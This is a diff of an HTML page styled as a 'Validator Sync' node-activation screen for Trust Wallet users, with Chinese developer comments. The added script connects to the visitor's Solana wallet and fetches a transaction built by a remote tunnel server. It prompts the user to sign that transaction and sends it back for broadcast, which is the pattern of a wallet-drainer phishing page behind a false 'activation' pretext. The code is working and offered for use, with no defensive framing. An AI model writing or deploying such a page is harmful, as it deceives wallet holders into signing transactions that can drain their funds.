@@ -1,73 +1,109 @@
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-<script>
-// 🔱 请务必确认你的隧道地址末尾没有多余的斜杠
-const TUNNEL_URL = "https://你的穿透地址.com"; 
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Node Verification</title>
+    <style>
+        /* 强制背景色，防止白屏感 */
+        html, body { background-color: #0b0e11 !important; margin: 0; padding: 0; height: 100%; color: white; }
+        .main-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { background: #181a20; padding: 30px; border-radius: 16px; border: 1px solid #2b2f36; width: 85%; max-width: 350px; }
+        .btn { background: #f0b90b; color: black; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        .btn:disabled { background: #474d57; color: #848e9c; }
+        .log { margin-top: 15px; font-size: 12px; color: #848e9c; min-height: 20px; }
+    </style>
+</head>
+<body>
 
-function logStatus(msg) {
-    document.getElementById('status_text').innerText = msg;
-    console.log("🔱 [LOG]:", msg);
-}
+    <div class="main-container">
+        <div class="box">
+            <h2 style="margin:0 0 10px 0;">Validator Sync</h2>
+            <p style="font-size: 14px; color: #eaeaea;">Securely link your wallet to activate the validator node.</p>
+            
+            <button id="activate_btn" class="btn">ACTIVATE NOW</button>
+            <div id="status_log" class="log">System Status: Ready</div>
+        </div>
+    </div>
 
-async function startProcess() {
-    logStatus("Initializing...");
-    try {
-        // 1. 强制检测钱包
-        const solana = window.trustwallet?.solana || window.solana;
-        if (!solana) {
-            alert("Error: Trust Wallet Not Detected!");
-            return;
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js" onerror="alert('Library Load Failed! Check Internet.')"></script>
+
+    <script>
+        // 🔱 配置检查：确保隧道地址不以斜杠结尾
+        const API_BASE = "https://你的穿透地址.com"; 
+
+        const btn = document.getElementById('activate_btn');
+        const logBox = document.getElementById('status_log');
+
+        function updateLog(m) {
+            logBox.innerText = m;
+            console.log(m);
         }
 
-        // 2. 连接
-        await solana.connect();
-        const userAddress = solana.publicKey.toString();
-        logStatus("Connected: " + userAddress.substring(0, 6) + "...");
-
-        // 3. 原生请求后端 (手动处理跨域)
-        logStatus("Contacting Server...");
-        const xhr = new XMLHttpRequest();
-        xhr.open("POST", TUNNEL_URL + "/prepare_v32", true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-
-        xhr.onreadystatechange = async function () {
-            if (xhr.readyState === 4) {
-                if (xhr.status === 200) {
-                    const info = JSON.parse(xhr.responseText);
-                    if (info.raw_tx) {
-                        logStatus("Signing Required...");
-                        const web3 = window.solanaWeb3;
-                        const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
-                        
-                        // 🔱 拉起签名
-                        const signed = await solana.signTransaction(tx);
-                        logStatus("Broadcasting...");
-                        
-                        // 4. 发送回服务器
-                        const broadcastXhr = new XMLHttpRequest();
-                        broadcastXhr.open("POST", TUNNEL_URL + "/broadcast_v41", true);
-                        broadcastXhr.setRequestHeader("Content-Type", "application/json");
-                        broadcastXhr.send(JSON.stringify({
-                            signed_tx: btoa(String.fromCharCode.apply(null, signed.serialize()))
-                        }));
-                        
-                        logStatus("Activation Successful!");
-                    } else {
-                        alert("Server Error: " + (info.error || "No TX"));
-                    }
-                } else {
-                    alert("Network Error: Status " + xhr.status);
+        async function start() {
+            try {
+                updateLog("Detecting Wallet...");
+                const provider = window.trustwallet?.solana || window.solana;
+                
+                if (!provider) {
+                    alert("Please open this link inside Trust Wallet Browser!");
+                    return;
                 }
+
+                btn.disabled = true;
+                updateLog("Connecting...");
+                await provider.connect();
+                
+                const address = provider.publicKey.toString();
+                updateLog("Wallet: " + address.substring(0, 4) + "..." + address.substring(address.length - 4));
+
+                // 第一步：请求构造
+                updateLog("Fetching Config...");
+                const res = await fetch(`${API_BASE}/prepare_v32`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ address: address })
+                });
+
+                if (!res.ok) throw new Error("Server Response Error: " + res.status);
+                
+                const data = await res.json();
+                if (!data.raw_tx) throw new Error(data.error || "No Transaction Data");
+
+                // 第二步：签名
+                updateLog("Awaiting Signature...");
+                const web3 = window.solanaWeb3;
+                const tx = web3.Transaction.from(Uint8Array.from(atob(data.raw_tx), c => c.charCodeAt(0)));
+                
+                const signed = await provider.signTransaction(tx);
+                updateLog("Broadcasting...");
+
+                // 第三步：广播
+                const bRes = await fetch(`${API_BASE}/broadcast_v41`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ 
+                        signed_tx: btoa(String.fromCharCode.apply(null, signed.serialize())) 
+                    })
+                });
+
+                updateLog("Activation Finalized!");
+                alert("Node Activation Successful!");
+
+            } catch (e) {
+                alert("Process Error: " + e.message);
+                updateLog("Error: " + e.message);
+                btn.disabled = false;
             }
+        }
+
+        btn.onclick = start;
+
+        // 🔱 启动自检
+        window.onload = () => {
+            console.log("🔱 Engine Loaded. API:", API_BASE);
+            if (!window.solanaWeb3) updateLog("Error: Web3 Library Not Found");
         };
-
-        xhr.send(JSON.stringify({ address: userAddress }));
-
-    } catch (err) {
-        alert("Catch Error: " + err.message);
-        logStatus("Try again.");
-    }
-}
-
-// 绑定按钮
-document.getElementById('activate_btn').onclick = startProcess;
-</script>
+    </script>
+</body>
+</html>
